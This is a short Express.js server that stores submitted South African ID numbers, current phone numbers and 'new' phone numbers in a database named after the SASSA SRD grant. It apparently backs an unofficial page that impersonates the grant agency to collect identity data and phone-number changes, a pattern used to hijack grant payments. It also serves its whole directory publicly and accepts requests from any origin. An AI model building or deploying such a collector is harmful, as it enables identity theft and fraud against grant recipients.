const express = require('express');
const path = require('path');
const cors = require('cors');
const { MongoClient } = require('mongodb');

const app = express();
app.use(cors());
app.use(express.json());

// Static files (index.html, image)
app.use(express.static(__dirname));

const uri = process.env.MONGODB_URI; // Store in Render ENV vars
const client = new MongoClient(uri, {
  tls: true,
});

let collection;

async function startServer() {
  try {
    await client.connect();
    const db = client.db('sassa');
    collection = db.collection('srd');

    app.post('/submit', async (req, res) => {
      const { idNumber, phoneNumber, newphoneNumber } = req.body;
      try {
        const exists = await collection.findOne({ idNumber, phoneNumber });
        if (exists) return res.status(409).send('Duplicate application');

        await collection.insertOne({
          idNumber,
          phoneNumber,
          newphoneNumber,
          timestamp: new Date(),
        });

        res.status(200).send('Application submitted');
      } catch (err) {
        console.error(err);
        res.status(500).send('Server error');
      }
    });

    // Fallback to index.html
    app.get('*', (req, res) => {
      res.sendFile(path.join(__dirname, 'index.html'));
    });

    const PORT = process.env.PORT || 3000;
    app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
  } catch (err) {
    console.error('Failed to connect to DB:', err);
  }
}

startServer();
